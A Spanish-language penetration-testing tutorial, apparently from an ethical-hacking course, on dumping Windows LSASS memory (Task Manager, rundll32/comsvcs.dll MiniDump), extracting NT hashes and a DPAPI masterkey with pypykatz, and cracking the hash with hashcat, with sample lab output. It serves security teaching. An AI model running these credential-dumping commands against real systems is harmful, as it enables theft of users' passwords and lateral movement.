
# Atacando a LSASS

Además de obtener copias de la base de datos SAM para volcar y descifrar hashes, también nos beneficiaremos al apuntar a LSASS, que es un servicio crítico que desempeña un papel central en la gestión de credenciales y los procesos de autenticación en todos los sistemas operativos Windows.

![Diagrama de clases](https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png)

Al iniciar sesión por primera vez, LSASS:

* Cachea las credenciales locales en memoria
* Crea [tokens de acceso](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Hace cumplir las políticas de seguridad
* Escribe en [el registro de seguridad de Windows](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Cubramos algunas de las técnicas y herramientas que podemos usar para volcar la memoria LSASS y extraer credenciales de un host que ejecuta Windows.

***

## <mark style="color:purple;">Dump de la memoria del proceso LSASS</mark>

De manera similar al proceso de atacar la base de datos SAM, con LSASS, sería prudente que primero creemos una copia del contenido de la memoria del proceso LSASS mediante la generación de un volcado de memoria. La creación de un archivo de volcado nos permite extraer credenciales sin conexión utilizando nuestro host de ataque. Tenga en cuenta que realizar ataques fuera de línea nos brinda más flexibilidad en la velocidad de nuestro ataque y requiere menos tiempo dedicado al sistema objetivo. Existen innumerables métodos que podemos utilizar para crear un volcado de memoria. Cubramos las técnicas que se pueden realizar utilizando herramientas ya integradas en Windows.

### **Método del administrador de tareas**

Con acceso a una sesión gráfica interactiva con el objetivo, podemos usar el administrador de tareas para crear un volcado de memoria. Esto requiere que:

![Volcado de memoria del Administrador de tareas](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

`Abra el Administrador de tareas` > `Seleccione la pestaña Procesos` > `Busque y haga clic con el botón derecho en el Local Security Authority Process` > `Seleccione Crear archivo de volcado`

Se crea y guarda un archivo llamado `lsass.DMP` en:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

Este es el archivo que transferiremos a nuestra máquina de atacante. Podemos utilizar el método de transferencia de archivos que se analiza en la sección [Atacando a SAM](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/atacando-a-sam.md) de este módulo para transferir el archivo de volcado a nuestra máquina de atacante.

### **Método Rundll32.exe y Comsvcs.dll**

El método del Administrador de tareas depende de que tengamos una sesión interactiva basada en GUI con un objetivo. Podemos utilizar un método alternativo para volcar la memoria del proceso LSASS a través de una utilidad de línea de comandos llamada [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32) . Esta forma es más rápida que el método del Administrador de tareas y más flexible porque podemos obtener una sesión de shell en un host de Windows con solo acceso a la línea de comando. Es importante tener en cuenta que las herramientas antivirus modernas reconocen este método como actividad maliciosa.

Antes de emitir el comando para crear el archivo de volcado, debemos determinar a qué ID de proceso ( `PID`) está asignado `lsass.exe`. Esto se puede hacer desde cmd o PowerShell:

**Encontrar LSASS PID en cmd**

Desde cmd, podemos emitir el comando `tasklist /svc` y encontrar lsass.exe y su ID de proceso en el campo PID.

```sh
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

**Encontrar LSASS PID en PowerShell**

Desde PowerShell, podemos emitir el comando `Get-Process lsass` y ver el ID del proceso en el campo `Id`.

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Una vez que tengamos el PID asignado al proceso LSASS, podemos crear el archivo de volcado.

**Creando lsass.dmp usando PowerShell**

Con una sesión de administrador de PowerShell, podemos ejecutar el siguiente comando para crear el archivo de volcado:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando, estamos ejecutando `rundll32.exe` para llamar a una función exportada de `comsvcs.dll` la cual también llama a la función MiniDumpWriteDump ( `MiniDump`) para volcar la memoria del proceso LSASS a un directorio específico ( `C:\lsass.dmp`). Recuerde que la mayoría de las herramientas antivirus modernas reconocen esto como malicioso e impiden que se ejecute el comando. En estos casos, necesitaremos considerar formas de evitar o desactivar la herramienta AV a la que nos enfrentamos. Las técnicas de derivación AV están fuera del alcance de este módulo.

Si logramos ejecutar este comando y generar el archivo `lsass.dmp`, podemos proceder a transferir el archivo a nuestra caja de ataque para intentar extraer las credenciales que puedan haber estado almacenadas en la memoria del proceso LSASS.

Nota: Podemos utilizar el método de transferencia de archivos que se analiza en la sección Atacar a SAM para obtener el archivo lsass.dmp del objetivo a nuestro host de ataque.

***

## <mark style="color:purple;">Usando Pypykatz para extraer credenciales</mark>

Una vez que tengamos el archivo de volcado en nuestro host de ataque, podemos usar una poderosa herramienta llamada [pypykatz](https://github.com/skelsec/pypykatz) para intentar extraer las credenciales del archivo .dmp. Pypykatz es una implementación de Mimikatz escrita íntegramente en Python. El hecho de que esté escrito en Python nos permite ejecutarlo en hosts de ataque basados ​​en Linux. Al momento de escribir este artículo, Mimikatz solo se ejecuta en sistemas Windows, por lo que para usarlo, necesitaríamos usar un host de ataque de Windows o ejecutar Mimikatz directamente en el objetivo, lo cual no es un escenario ideal. Esto hace que Pypykatz sea una alternativa atractiva porque todo lo que necesitamos es una copia del archivo de volcado y podemos ejecutarlo sin conexión desde nuestro host de ataque basado en Linux.

Recuerde que LSASS almacena las credenciales que tienen sesiones de inicio de sesión activas en sistemas Windows. Cuando volcamos la memoria del proceso LSASS en el archivo, esencialmente tomamos una "instantánea" de lo que había en la memoria en ese momento. Si hubo sesiones de inicio de sesión activas, las credenciales utilizadas para establecerlas estarán presentes. Vamos a ejecutar Pypykatz contra el archivo de volcado para averiguarlo.

### **Ejecutando Pypykatz**

El comando inicia el uso de `pypykatz` para analizar los secretos ocultos en el volcado de memoria del proceso LSASS. Usamos `lsa` en el comando porque LSASS es un subsistema de `local security authority`, luego especificamos la fuente de datos como un archivo `minidump`, seguido por la ruta al archivo de volcado ( `/home/kali/Documents/lsass.dmp`) almacenado en nuestro host de ataque. Pypykatz analiza el archivo de volcado y genera los resultados:

```shell-session
afsh4ck@kali$ pypykatz lsa minidump /home/kali/Descargas/lsass.dmp 

INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605

== LogonSession ==
authentication_id 1354581 (14ab55)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354581
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== WDIGEST [14ab55]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)

== LogonSession ==
authentication_id 1343859 (148173)
session_id 2
username DWM-2
domainname Window Manager
logon_server 
logon_time 2021-12-14T18:14:25.248681+00:00
sid S-1-5-90-0-2
luid 1343859
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
	== WDIGEST [148173]==
		username WIN-6T0C3J2V6HP$
		domainname WORKGROUP
		password None
		password (hex)
```

Echemos un vistazo más detallado a parte de la información útil del resultado.

### **MSV**

```shell-session
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) es un paquete de autenticación en Windows al que LSA recurre para validar los intentos de inicio de sesión en la base de datos SAM. Pypykatz extrajo los hashes `SID`, `Username`, `Domain`e incluso hashes `NT`& `SHA1` asociados con la sesión de inicio de sesión de la cuenta de usuario bob almacenada en la memoria del proceso LSASS. Esto resultará útil en la etapa final de nuestro ataque que se cubre al final de esta sección.

### **WDIGEST**

```shell-session
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

`WDIGEST`es un protocolo de autenticación más antiguo habilitado de forma predeterminada en `Windows XP`- `Windows 8`y `Windows Server 2003`- `Windows Server 2012`. LSASS almacena en caché las credenciales utilizadas por WDIGEST en texto sin cifrar. Esto significa que si nos encontramos apuntando a un sistema Windows con WDIGEST habilitado, lo más probable es que veamos una contraseña en texto sin cifrar. Los sistemas operativos Windows modernos tienen WDIGEST desactivado de forma predeterminada. Además, es fundamental tener en cuenta que Microsoft lanzó una actualización de seguridad para los sistemas afectados por este problema con WDIGEST. Podemos estudiar los detalles de esa actualización de seguridad [aquí](https://msrc-blog.microsoft.com/2014/06/05/an-overview-of-kb2871997/) .

### **Kerberos**

```shell-session
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) es un protocolo de autenticación de red utilizado por Active Directory en entornos de dominio de Windows. Las cuentas de usuario del dominio reciben tickets tras la autenticación con Active Directory. Este ticket se utiliza para permitir que el usuario acceda a recursos compartidos en la red a la que se le ha otorgado acceso sin necesidad de escribir sus credenciales cada vez. LSASS `caches passwords`, `ekeys`, `tickets`y `pins`asociado con Kerberos. Es posible extraerlos de la memoria del proceso LSASS y utilizarlos para acceder a otros sistemas unidos al mismo dominio.

### **DPAPI**

```shell-session
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

La interfaz de programación de aplicaciones de protección de datos o [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) es un conjunto de API en los sistemas operativos Windows que se utilizan para cifrar y descifrar blobs de datos DPAPI por usuario para las funciones del sistema operativo Windows y varias aplicaciones de terceros. Estos son solo algunos ejemplos de aplicaciones que usan DPAPI y para qué lo usan:

<table data-header-hidden><thead><tr><th width="302"></th><th></th></tr></thead><tbody><tr><td>Aplicaciones</td><td>Uso de DPAPI</td></tr><tr><td><code>Internet Explorer</code></td><td>Datos de autocompletado del formulario de contraseña (nombre de usuario y contraseña para sitios guardados).</td></tr><tr><td><code>Google Chrome</code></td><td>Datos de autocompletado del formulario de contraseña (nombre de usuario y contraseña para sitios guardados).</td></tr><tr><td><code>Outlook</code></td><td>Contraseñas para cuentas de correo electrónico.</td></tr><tr><td><code>Remote Desktop Connection</code></td><td>Credenciales guardadas para conexiones a máquinas remotas.</td></tr><tr><td><code>Credential Manager</code></td><td>Credenciales guardadas para acceder a recursos compartidos, unirse a redes inalámbricas, VPN y más.</td></tr></tbody></table>

Mimikatz y Pypykatz pueden extraer el DPAPI `masterkey`del usuario que inició sesión cuyos datos están presentes en la memoria del proceso LSASS. Esta clave maestra luego se puede usar para descifrar los secretos asociados con cada una de las aplicaciones usando DPAPI y dar como resultado la captura de credenciales para varias cuentas. Las técnicas de ataque DPAPI se tratan con mayor detalle en el módulo [Escalada de privilegios de Windows](https://academy.hackthebox.com/module/details/67) .

### **Descifrando el NT Hash con Hashcat**

Ahora podemos usar Hashcat para descifrar NT Hash. En este ejemplo, solo encontramos un hash NT asociado con el usuario Bob, lo que significa que no necesitaremos crear una lista de hashes como lo hicimos en la `Attacking SAM`sección de este módulo. Después de configurar el modo en el comando, podemos pegar el hash, especificar una lista de palabras y luego descifrar el hash.

```shell-session
afsh4ck@kali$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

Nuestro intento de descifrado se completa y nuestro ataque general puede considerarse un éxito.
